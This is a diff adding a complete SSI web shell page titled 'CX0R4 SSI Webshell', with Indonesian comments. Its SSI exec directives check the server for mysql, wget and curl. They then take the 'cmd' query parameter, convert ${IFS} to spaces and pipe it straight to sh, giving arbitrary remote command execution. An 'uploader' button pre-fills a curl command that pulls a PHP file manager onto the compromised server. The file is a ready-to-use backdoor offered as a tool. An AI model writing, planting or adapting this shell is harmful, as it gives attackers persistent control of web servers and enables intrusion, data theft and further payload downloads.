@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CX0R4 SSI Webshell</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<style type="text/css">
+	/* Style untuk Latar Belakang Hitam dan Teks Putih */
+	body {
+		background-color: #000000;
+		color: #FFFFFF;
+		font-family: 'Courier New', monospace; 
+		margin: 0;
+		padding: 0;
+		text-align: center;
+	}
+
+	/* Style untuk Konten Utama Rata Tengah */
+	.main-container {
+		width: 80%;
+		max-width: 900px;
+		margin: 50px auto;
+		padding: 20px;
+		background-color: #111111;
+		border: 1px solid #333;
+		text-align: left;
+		box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+	}
+	
+	/* Style untuk Input dan Button */
+	.input {
+		background: transparent;
+		color: #FFFFFF;
+		border-color: #FFFFFF;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+		padding: 5px 10px;
+	}
+	
+	/* Style untuk Kotak Input Teks */
+	#command {
+		background: rgba(255, 255, 255, 0.1);
+		color: #FFFFFF;
+		border: 1px solid #777;
+		padding: 5px;
+		width: 50%;
+	}
+
+	/* Style untuk Hasil Command */
+	pre {
+		white-space: pre-wrap;
+		word-wrap: break-word;
+		text-align: left;
+		border: 1px dashed #555;
+		padding: 10px;
+		background-color: rgba(20, 20, 20, 0.9);
+		max-height: 400px;
+		overflow: auto;
+	}
+	
+	hr {
+		border-color: #333;
+	}
+	
+	.status {
+		color: #00FF00;
+	}
+	
+	.status-off {
+		color: #FF0000;
+	}
+</style>
+</head>
+<body>
+
+<div class="main-container">
+	<b><font size="4"><i>CX0R4 SSI Webshell</i></font></b>
+	<hr>
+	
+	<!-- SSI untuk System Info -->
+	System : <b class="status"><!--#echo var="SERVER_SOFTWARE" --></b>
+	<br>
+	Current Path : <b class="status"><!--#echo var="DOCUMENT_ROOT" --></b><br>
+	
+	<!-- SSI Exec untuk mengecek tools -->
+	MySql : <b class="status"><!--#exec cmd="which mysql && echo 'Available' || echo 'Not Available'" --></b>
+	&nbsp;|&nbsp; 
+	Wget : <b class="status"><!--#exec cmd="which wget && echo 'Available' || echo 'Not Available'" --></b>
+	&nbsp;|&nbsp; 
+	Curl : <b class="status"><!--#exec cmd="which curl && echo 'Available' || echo 'Not Available'" --></b>
+	<br>
+	<hr>
+	
+	COMMAND : 
+	<input type="text" size="30" id="command" class="text" name="command" placeholder="Enter command...">&nbsp;
+	<button class="input" id="gas" onclick="executeCommand();">execute</button> 
+	<button class="input" id="addupload" onclick="addUpload();">uploader</button>
+	<button class="input" id="clear" onclick="clearOutput();">clear</button>
+	<br><br>
+	
+	Executed Command : <b><font id="cmd-display"></font></b>
+	
+	<!-- Area untuk output command -->
+	<div id="output-container">
+		<pre id="command-output">
+<!--#if expr="$QUERY_STRING" -->
+<!--#set var="command" value="$QUERY_STRING" -->
+<!--#if expr="$command = /cmd=/" -->
+<!--#set var="clean_cmd" value="$command" -->
+<!--#exec cmd="echo '$clean_cmd' | sed 's/cmd=//' | sed 's/${IFS}/ /g' | sh" -->
+<!--#endif -->
+<!--#endif -->
+		</pre>
+	</div>
+	
+	<!-- Info Server -->
+	<hr>
+	<div style="font-size: 12px; color: #888;">
+		Server: <!--#echo var="SERVER_NAME" --> | 
+		SSI Support: <!--#if expr="$SERVER_SOFTWARE = /Apache/" -->Enabled<!--#else -->Limited<!--#endif --> | 
+		Time: <!--#echo var="DATE_LOCAL" -->
+	</div>
+</div>
+
+<script language="javascript">
+/* Fungsi untuk execute command */
+function executeCommand() {
+	var command = document.getElementById('command').value;
+	if (!command) {
+		alert('Please enter a command');
+		return;
+	}
+	
+	// Replace spaces with ${IFS} for URL safety
+	var encodedCommand = command.replace(/ /g, '${IFS}');
+	
+	// Display the command being executed
+	document.getElementById('cmd-display').textContent = command;
+	
+	// Redirect to same page with command parameter
+	window.location.href = '?cmd=' + encodeURIComponent(encodedCommand);
+}
+
+/* Fungsi untuk uploader */
+function addUpload() {
+	document.getElementById('command').value = "curl -s https://raw.githubusercontent.com/prasathmani/tinyfilemanager/master/tinyfilemanager.php -o tinyfilemanager.php";
+	document.getElementById('cmd-display').textContent = "Downloading file manager...";
+}
+
+/* Fungsi untuk clear output */
+function clearOutput() {
+	document.getElementById('command-output').textContent = '';
+	document.getElementById('cmd-display').textContent = '';
+	document.getElementById('command').value = '';
+	window.location.href = window.location.pathname; // Clear URL parameters
+}
+
+/* Execute on Enter key */
+document.getElementById('command').addEventListener('keyup', function(event) {
+	if (event.keyCode === 13) {
+		event.preventDefault();
+		executeCommand();
+	}
+});
+
+/* Load command from URL on page load */
+window.onload = function() {
+	var urlParams = new URLSearchParams(window.location.search);
+	var cmdParam = urlParams.get('cmd');
+	if (cmdParam) {
+		var decodedCmd = cmdParam.replace(/\${IFS}/g, ' ');
+		document.getElementById('cmd-display').textContent = decodedCmd;
+		document.getElementById('command').value = decodedCmd;
+	}
+}
+</script>
+
+</html>
